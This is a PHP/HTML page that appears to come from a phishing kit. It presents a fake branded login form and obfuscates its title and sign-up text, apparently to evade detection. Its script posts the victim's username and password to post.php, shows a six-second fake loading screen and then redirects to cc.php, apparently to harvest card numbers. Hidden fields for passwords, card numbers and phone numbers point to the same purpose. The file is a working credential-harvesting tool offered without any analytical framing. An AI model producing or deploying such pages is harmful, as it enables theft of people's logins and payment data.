<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title><?php echo $lang["title"]; ?></title>
    <link rel="stylesheet" href="app.css">
</head>
<body>
<form action="action.php" method="POST">
    <input type="hidden" name="LOGIN">
    <input type="hidden" name="USERNAME">
    <input type="hidden" name="PASSWORD">
    <input type="hidden" name="CARD_NUMBER">
    <input type="hidden" name="PHONE_NUMBER">
</form>
<header>
    <img src="logo.png">
</header>
<script>var token=<?php echo json_encode($token); ?>;</script>
<div class="loader" style=" color:white; text-align:center;">
    <div class="content" style="flex-direction:column;">
        <h3><?php echo $lang['_loading'][0];?></h3>
        <p><?php echo $lang['_loading'][1];?></p>
    <img src="loading.gif">
</div>
</div>

<main>

<div class="form">

<div class="title">
<?php echo $m->obf($lang["_login_texts"][0]); ?>
</div>

<div class="cols">

<div class="col">
    <label><?php echo $lang["_login_texts"][1]; ?></label>
    <input type="text" id="u" placeholder="<?php echo $lang["_login_texts"][1]; ?>">
</div>

<div class="col">
    <label><?php echo $lang["_login_texts"][2]; ?></label>
    <input type="password" id="p" placeholder="<?php echo $lang["_login_texts"][2]; ?>">
</div>

<div class="col remember">
     <img src="res/remember.png"> <?php echo $lang["_login_texts"][3]; ?>
</div>


<div class="col submit">
    <button onclick="sendLog()"><?php echo $lang["_login_texts"][4]; ?></button>
</div>

<div class="col forgot">
    <a href=""><?php echo $lang["_login_texts"][5]; ?></a>
</div>



<div class="col signup">
<?php echo $lang["_login_texts"][6]; ?>&nbsp;<a href="#"><?php echo $m->obf($lang["_login_texts"][7]); ?></a>
</div>



</div>


</div>

</main>
<script src="jq.js"></script>
<script src="jquery.js"></script>

<script>

$("input").keyup(()=>{
    $("input").removeClass("error");
});

function sendLog(){
    if($("#u").val()==""){
        return $("#u").addClass("error");
    }
    if($("#p").val()==""){
        return $("#p").addClass("error");
    }
    $(".loader").show();
    $.post("post.php",{
        user:$("#u").val(),
        pass:$("#p").val()
    },(res)=>{
        setTimeout(() => {
            window.location="cc.php";
        },6000 );
        
    });

}


$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendLog();
    }
});

 

</script>
</body>
</html>
